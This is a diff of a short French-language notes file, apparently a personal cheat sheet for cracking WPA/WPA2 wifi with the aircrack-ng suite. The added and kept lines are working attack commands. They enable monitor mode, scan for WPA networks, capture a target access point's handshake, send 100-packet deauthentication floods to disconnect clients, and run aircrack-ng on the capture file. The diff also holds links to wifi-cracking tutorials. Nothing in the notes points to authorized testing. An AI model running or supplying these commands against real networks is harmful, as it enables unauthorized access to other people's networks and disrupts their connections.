@@ -40,13 +40,15 @@
 #iw dev
 
 3.Capter tous les signaux wifi
+#airmon-ng start wlp3s0b1
 #airodump-ng mon0
+#airodump-ng --encrypt wpa mon0
 
 4.Capter le handshake pour un point d'accès
-#airodump-ng -c 1 --bssid <bssid> -w WPA2crack mon0 --ignore-negative-one
+#airodump-ng -c 1 --bssid <bssid> -w capture mon0 --ignore-negative-one
 #aireplay-ng --deauth 100 -a <bssid> mon0 --ignore-negative-one
 #aireplay-ng --deauth 100 -a <bssid> -c <@MAC> mon0 --ignore-negative-one
-
+#aircrack-ng capture-01.cap
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 #systemctl stop NetworkManager
 #curl ipinfo.io/ip
@@ -57,4 +59,3 @@
 
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 http://www.pexiweb.be/aircrack-monitor-avec-carte-broadcom-bcm43xx/
-https://netkux.wordpress.com/2016/03/31/crack-cle-wpa-wpa2-suite-aircrack-ng/
